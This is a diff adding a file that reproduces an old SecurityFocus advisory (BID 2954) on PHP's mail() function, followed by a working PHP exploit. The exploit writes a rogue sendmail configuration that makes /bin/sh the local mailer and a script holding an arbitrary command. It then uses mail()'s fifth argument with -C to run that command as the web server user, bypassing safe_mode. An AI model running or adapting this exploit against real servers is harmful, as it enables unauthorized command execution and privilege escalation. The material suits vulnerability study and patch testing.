@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/2954/info
+
+PHP is the Personal HomePage development toolkit, distributed by the PHP.net, and maintained by the PHP Development Team in public domain.
+
+A problem with the toolkit could allow elevated privileges, and potentially unauthorized access to restricted resources. A local user may upload a malicious php script, and execute it with a custom query string.
+
+This makes it possible for a local user to execute commands as the HTTP process UID, and potentially gain access with the same privileges of the HTTP UID.
+
+It has been reported that the proposed fix does not entirely fix the problem, as it's possible to pass command line parameters to sendmail when safe_mode is enabled. This may be done through the 5th argument permitted by safe_mode. 
+
+<?
+$script=tempnam("/tmp", "script");
+$cf=tempnam("/tmp", "cf");
+
+$fd = fopen($cf, "w");
+fwrite($fd, "OQ/tmp
+Sparse=0
+R$*" . chr(9) . "$#local $@ $1 $: $1
+Mlocal, P=/bin/sh, A=sh $script");
+fclose($fd);
+
+$fd = fopen($script, "w");
+fwrite($fd, "rm -f $script $cf; ");
+fwrite($fd, $cmd);
+fclose($fd);
+
+mail("nobody", "", "", "", "-C$cf");
+?>
